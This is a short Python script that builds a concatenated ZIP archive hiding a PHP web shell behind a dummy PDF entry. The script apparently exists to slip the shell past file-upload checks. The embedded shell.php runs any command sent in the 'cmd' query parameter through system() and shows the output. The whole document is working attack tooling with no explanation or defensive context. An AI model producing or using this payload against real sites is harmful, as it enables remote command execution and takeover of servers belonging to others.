#!/usr/bin/env python3

import os
import subprocess
import shutil

pdf_name = "dummy.pdf"
shell_dir = "pwn"
shell_file = "shell.php"
head_zip = "head.zip"
tail_zip = "tail.zip"
final_zip = "concat.zip"

with open(pdf_name, "wb") as f:
    f.write(b"%PDF-1.4\n%EOF")

os.makedirs(shell_dir, exist_ok=True)
with open(os.path.join(shell_dir, shell_file), "w") as f:
    f.write("""<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
""")

subprocess.run(["zip", head_zip, pdf_name])
subprocess.run(["zip", "-r", tail_zip, shell_dir])

with open(final_zip, "wb") as f_out:
    for part in [head_zip, tail_zip]:
        with open(part, "rb") as f_in:
            f_out.write(f_in.read())

print(f"[+] Polyglot ZIP archive created: {final_zip}")

os.remove(pdf_name)
os.remove(head_zip)
os.remove(tail_zip)
shutil.rmtree(shell_dir)
